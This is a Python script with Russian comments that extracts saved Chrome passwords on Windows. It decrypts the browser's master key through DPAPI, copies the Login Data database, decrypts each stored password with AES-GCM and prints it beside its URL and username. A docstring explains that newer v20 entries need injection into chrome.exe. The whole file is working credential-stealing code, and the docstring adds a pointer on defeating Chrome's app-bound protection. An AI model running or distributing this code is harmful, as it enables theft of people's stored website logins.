# /// script
# requires-python = ">=3.10"
# dependencies = [
#     "pycryptodome",
#     "pywin32",
# ]
# ///
# platform: windows-only (pywin32 / winreg / WMI)

import os
import json
from base64 import b64decode
import sqlite3 
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
from pathlib import Path
"""
ВАЖНО: этот код рассчитан на старую схему шифрования Chrome (v10).
На современном Chrome он не расшифрует пароли по двум причинам:

1. Для новых записей (префикс v20) ключ лежит не в os_crypt.encrypted_key,
   а в отдельном поле os_crypt.app_bound_encrypted_key (блоб APPB).
   Старое поле осталось только для v10-записей.

2. Расшифровать APPB-блоб можно только через COM-интерфейс IElevator,
   который реализует служба Google Chrome Elevation Service
   (elevation_service.exe). Служба проверяет вызывающий процесс
   (путь, подпись Google, SID, integrity level) и отдаёт ключ
   только доверенному chrome.exe. Из python.exe вызов отклоняется.

Итог: v10-записи ещё читаются старым путём (DPAPI + AES-GCM),
v20-записи без инжекта в chrome.exe не расшифровать.
"""


def getMasterKey(localState):
    with open(localState, "r") as f:
        state = json.loads(f.read()) # распарс json с файла 
        masterKey = b64decode(state["os_crypt"]["encrypted_key"])[5:] # просто получили нужное поле 
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
        # функция Windows которая расшифровывает, ранее зашифрованные  функцией
        # CryptProtectData данные. Расшифрует только если тот же пользователь
        # exposed by Windows’ Data Protection API (DPAPI).
        return masterKey

def decryptPassword(buff, masterKey):
    IV = buff[3:15]
    # это называется вектор инициализации, добавляется в начале 
    # что то похожее на соль, но это не соль в прямом смысле ее понимания
    ciphertext = buff[15:]
    aes = AES.new(masterKey, AES.MODE_GCM, IV)
    plaintext = aes.decrypt(ciphertext)
    password = plaintext[:-16].decode()
    # убираем тег, который нужен для того чтобы показать что данные не изменялись,  тег считается как функция от шифротекста ключа и IV 
    # и просто добавляется в конец
    return password

path = Path.home() / 'AppData\\Local\\Google\\Chrome\\User Data'
localState = path / "Local State"
loginData = path / "Default" / "Login Data"
masterKey = getMasterKey(localState)
shutil.copy2(loginData, "Login Data") # копирование файл + метаданные
conn = sqlite3.connect("Login Data") # открывает соединение с sqlite db по указанному пути
cursor = conn.cursor() # через него выполняется чтение бд
try:
    c = "SELECT action_url, username_value, password_value FROM logins"
    cursor.execute(c)
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        ciphertext = r[2]
        try:
            decryptedPassword = decryptPassword(ciphertext, masterKey)
            if len(username) > 0:
                print(f"{url}")
                print(f"Username: {username}")
                print(f'Password: {decryptedPassword}')
        except:
            continue
except Exception as e:
    pass
cursor.close()
conn.close()
try:
    os.remove("Login Data")
except Exception as e:
    pass
